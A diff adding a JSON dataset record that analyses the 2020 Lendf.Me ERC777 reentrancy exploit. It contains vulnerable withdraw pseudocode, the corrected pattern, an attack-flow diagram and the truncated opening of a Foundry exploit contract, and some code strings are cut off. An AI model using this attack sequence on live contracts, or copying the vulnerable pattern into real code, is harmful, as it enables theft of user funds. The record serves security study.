@@ -1,0 +1,33 @@
+{
+ "id": "2020__2020-04-19_LendfMe_Reentrancy",
+ "source_file": "2020/2020-04-19_LendfMe_Reentrancy.md",
+ "title": "Lendf.Me — ERC777 Reentrancy Attack Analysis",
+ "date": "2020-04-19",
+ "protocol": "Lendf.Me",
+ "chain": "Ethereum Mainnet",
+ "loss_raw": "~$25,000,000 (imBTC, ETH, and multiple other assets)",
+ "loss_usd": 25000000.0,
+ "root_cause": "Reentrancy via ERC777 token's `tokensToSend` hook allows withdrawal before balance update",
+ "attack_tx": "0xae7d664b...",
+ "vulnerable_contract": "0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea",
+ "classes": [
+  "reentrancy"
+ ],
+ "code_before": [
+  "❌ Vulnerable withdraw logic (pseudocode)\nfunction withdraw(address asset, uint256 requestedAmount) external returns (uint256) {\n    uint256 balance = accountBalance[msg.sender][asset];\n\n    //",
+  "❌ Problem: token transfer occurs before balance update\n    // ERC777 transfer → tokensToSend hook called → reentrancy possible\n    require(IERC20(asset).transfer(msg.sender, requestedAmount));\n\n    //",
+  "❌ Balance deduction happens after transfer (original balance still intact during reentry)\n    accountBalance[msg.sender][asset] = balance - requestedAmount;\n}\n\n//"
+ ],
+ "code_after": [
+  "✅ Correct pattern (Checks-Effects-Interactions)\nfunction withdraw(address asset, uint256 requestedAmount) external returns (uint256) {\n    uint256 balance = accountBalance[msg.sender][asset];\n    require(balance >= requestedAmount, \"insufficient balance\");\n\n    //",
+  "✅ Update state first (Effects)\n    accountBalance[msg.sender][asset] = balance - requestedAmount;\n\n    //"
+ ],
+ "steps": [
+  "[2] supply(imBTC, balance - 1) → normal deposit",
+  "[3] supply(imBTC, 1) → deposit 1 satoshi"
+ ],
+ "other_code": [
+  "Attacker Contract\n    │\n    ├─[1] Register tokensToSend hook with ERC1820\n    │       erc1820.setInterfaceImplementer(this, TOKENS_SENDER_HASH, this)\n    │\n    ├─[2] supply(imBTC, balance - 1)   → normal deposit\n    │\n    ├─[3] supply(imBTC, 1)             → deposit 1 satoshi\n    │       └─ imBTC transfer occurs\n    │           └─ ERC777: tokensToSend hook invoked ────────────────┐\n    │                                                                 │\n    ├─[4] withdraw(imBTC, MAX)  ◄── Reentry! Balance not yet updated │\n    │       └─ Successfully withdraws all protocol imBTC             │\n    │                                                                 │\n    │       ◄─────────────────────────────────────────────────────────┘\n    │\n    └─[5] Transfer stolen imBTC to attacker address",
+  "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./../interface.sol\";\n\ninterface IMoneyMarket {\n    function supply(address asset, uint256 amount) external returns (uint256);\n    function withdraw(address asset, uint256 requestedAmount) external returns (uint256);\n}\n\ncontract LendfMeExploit is Test {\n    address victim = 0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea;  // Lendf.Me contract\n    address attacker = 0xA9BF70A420d364e923C74448D9D817d3F2A77822;\n    IERC20 imBTC = IERC20(0x3212b29E33587A00FB1C83346f5dBFA69A458923);  // ERC777 token\n    IERC1820Registry internal erc1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);\n\n    bytes32 internal constant TOKENS_SENDER_INTERFACE_HASH =\n        0x29ddb589b1fb5fc7cf394961c1adf5"
+ ]
+}
